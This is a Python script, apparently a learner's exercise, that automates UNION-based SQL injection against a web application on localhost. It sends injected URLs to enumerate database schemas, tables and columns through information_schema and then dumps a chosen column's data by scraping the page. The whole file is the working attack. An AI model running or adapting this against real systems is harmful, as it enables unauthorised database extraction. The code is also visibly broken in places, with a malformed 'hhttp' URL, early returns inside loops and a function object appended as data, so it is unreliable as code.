import requests
import bs4


def fetchdbnamecount():
    # print(" dbname Count")
    url = "http://localhost' and 0 union select 1,2,3,4,count(schema_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata -- -"
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    count = temp.get_text().strip()
    return count


dbnamecount = fetchdbnamecount()

# print(dbnamecount)

Dbname = []


def fertchdbname():
    for count in range(1, int(dbnamecount) + 1):
        url = (
            "http://localhost' and 0 union select 1,2,3,4,schema_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata limit "
            + str(count)
            + "-- -"
        )

        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        #    print(soup)
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        dbnames = temp.get_text().strip()
        Dbname.append(dbnames)


fertchdbname()
print(Dbname)

Dbname = input("Enter your dbname :")
print(Dbname)


def tablecount():
    print(" tablename Count")
    url = (
        "http://localhost' and 0 union select 1,2,3,4,count(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema = '"
        + Dbname
        + "'-- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    count = temp.get_text().strip()
    return count


tcount = tablecount()
print(tcount)

Dtablename = []


def tablename():
    print("table name")
    for table in range(1, int(tcount) + 1):
        url = (
            "http://localhost' and 0 union select 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema = '"
            + Dbname
            + "' limit "
            + str(table)
            + " -- -"
        )

        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        #    print(soup)
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        dbnames = temp.get_text().strip()

        Dtablename.append(dbnames)


tablename()
print(Dtablename)

Dtablename = input("Enter Your Table name:")
print(Dtablename)


def columncount():
    print(" Column Count")
    url = (
        "http://localhost' and 0 union select 1,2,3,4,count(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema = '"
        + Dbname
        + "'-- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    tempp = temp.get_text().strip()
    return tempp


d_count = columncount()
print(d_count)

column_name = []


def Columnname():
    print("Column Name")
    for column in range(1, int(d_count) + 1):
        # print(column)
        url = (
            "http://localhost' and 0 union select 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema = '"
            + Dbname
            + "'  and table_name = '"
            + Dtablename
            + "' limit "
            + str(column)
            + "-- -"
        )

        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        #    print(soup)
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        dColumnname = temp.get_text().strip()

        # jjj = column_name.append(dColumnname)

        return dColumnname


column_name.append(Columnname())

print(column_name)


def datas():
    print()
columnname = input("Enter Column Name : ")
print()

def dataCount():
    print("datacount")
    url = (
            "hhttp://localhost' and 0 union select 1,2,3,4,count("
            + columnname
            + "),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
            + Dtablename
            + " -- -"
        )
    response = requests.get(url)
    doc = bs4.BeautifulSoup(response.text, "html.parser")
    result = doc.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
    count = result.get_text().strip()
    return count
d= dataCount()
print(d)


data_S = []

def Data():
        
        for data in range(1, int(d) + 1):
            
            url = (
                "http://localhost' and 0 union select 1,2,3,4,"
                + columnname
                + ",6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
                + Dtablename
                + " limit "
                + str(data)
                + " -- -"
            )
            response = requests.get(url)
            doc = bs4.BeautifulSoup(response.text, "html.parser")
            result = doc.find(
                "div",
                {
                    "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
                },
            )
            dbname = result.get_text().strip()
            # data_S.append(dbname)
            return dbname
        data_S.append(Data)

# Data()
print(data_S)
# print()


datas()
print(datas())
datas()
print(datas())
